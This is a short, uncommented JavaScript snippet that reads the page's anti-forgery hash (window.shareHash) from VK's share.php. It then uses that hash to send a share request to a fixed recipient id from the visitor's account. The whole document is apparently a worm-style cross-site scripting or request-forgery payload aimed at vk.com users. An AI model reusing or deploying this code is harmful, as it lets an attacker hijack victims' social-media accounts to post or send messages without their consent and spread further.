var x = new XMLHttpRequest;
x.open("GET", "share.php"), x.send(), x.onload = function(a) {
        b = x.responseText.match(/window.shareHash = \'(.*?)\';/)[1];
    send(share_url(b));
};

function send(a) {
    var b = new XMLHttpRequest;
    b.open("GET", a), b.send()
}

function share_url(a) {
    return "https://vk.com/share.php?act=a_submit&al=1&hash=" + a + "&message=" + test + "&to=" + 51722292 + "&url="
}
